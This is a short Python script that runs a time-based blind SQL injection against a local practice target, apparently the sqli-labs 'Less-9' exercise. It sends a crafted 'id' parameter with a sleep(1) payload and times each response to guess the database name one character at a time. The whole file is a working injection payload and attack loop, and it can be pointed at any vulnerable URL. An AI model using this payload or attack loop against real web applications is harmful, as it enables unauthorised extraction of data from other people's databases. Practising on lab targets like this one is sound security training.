import requests
import re
import time
import string
flag='You are in'

# dual is built in dummy tablein mysql

url='http://localhost/Less-9/?id='

while True:
	for c in string.printable:
		payload=f"1' and (select sleep(1) from dual where database() like 'securit{c}')  --+"
		start=time.time()
		resp=requests.get(url+payload)
		delay=time.time()-start
		if re.search(flag,resp.text) and delay>=1:
			print(c)
	break